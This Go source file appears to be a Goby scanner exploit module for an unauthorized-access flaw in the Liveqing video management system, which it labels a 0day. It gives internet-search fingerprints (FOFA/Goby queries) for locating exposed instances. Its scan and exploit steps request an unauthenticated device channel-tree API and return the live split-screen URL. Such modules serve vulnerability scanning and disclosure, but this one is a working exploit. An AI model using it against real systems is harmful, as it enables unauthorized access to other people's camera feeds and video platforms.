package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Liveqing video management unauthorized Vulnerability",
    "Description": "<p>liveqing video management system is liveqing Information Technology to provide user management and Web visual page video management platform, supporting local, Intranet, private cloud deployment; Support Windows, Linux installation-free, one-key startup after decompression; Support distributed deployment; Complete secondary development interface documentation; WEB visual management background.</p>",
    "Product": "Liveqing video management",
    "Homepage": "https://www.liveqing.com/",
    "DisclosureDate": "2022-11-06",
    "Author": "树懒",
    "FofaQuery": "body=\"js/liveplayer-lib.min.js\" && body=\"css/index\"",
    "GobyQuery": "body=\"js/liveplayer-lib.min.js\" && body=\"css/index\"",
    "Level": "2",
    "Impact": "<p>An attacker can take control of the entire system through unauthorized access vulnerabilities, resulting in an extremely insecure system.</p>",
    "Recommendation": "<p>1. the official temporarily not to repair the vulnerability, please contact the manufacturer to repair: <a href=\"https://www.liveqing.com/\">https://www.liveqing.com/</a></p><p>2. Set access policies and whitelist access on security devices such as firewalls.</p><p>3. Disable the public network from accessing the system if necessary.</p>",
    "References": [],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/v1/device/channeltree?serial=&pcode",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[",
                        "bz": "该接口能够访问意味着存在未授权"
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "       \"customName\": \"\",",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/v1/device/channeltree?serial=&pcode",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[",
                        "bz": "该接口能够访问说明能够访问分屏接口"
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|text|{{{fixedhostinfo}}}/#/screen"
            ]
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.5",
    "Translation": {
        "CN": {
            "Name": "青柿视频管理系统存在未授权漏洞",
            "Product": "青柿视频管理系统",
            "Description": "<p>青柿视频管理系统是青柿信息科技提供用户管理及Web可视化页面视频管理平台，支持本地、内网、私有云部署；支持Windows，Linux免安装，解压一键启动；支持分布式部署；完整二次开发接口文档；WEB可视管理后台。该系统存在未授权，可任意添加管理员账户。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.liveqing.com/\">https://www.liveqing.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Liveqing video management unauthorized Vulnerability",
            "Product": "Liveqing video management",
            "Description": "<p>liveqing video management system is liveqing Information Technology to provide user management and Web visual page video management platform, supporting local, Intranet, private cloud deployment; Support Windows, Linux installation-free, one-key startup after decompression; Support distributed deployment; Complete secondary development interface documentation; WEB visual management background.<br></p>",
            "Recommendation": "<p>1. the official temporarily not to repair the vulnerability, please contact the manufacturer to repair: <a href=\"https://www.liveqing.com/\">https://www.liveqing.com/</a></p><p>2. Set access policies and whitelist access on security devices such as firewalls.</p><p>3. Disable the public network from accessing the system if necessary.</p>",
            "Impact": "<p>An attacker can take control of the entire system through unauthorized access vulnerabilities, resulting in an extremely insecure system.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7365"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
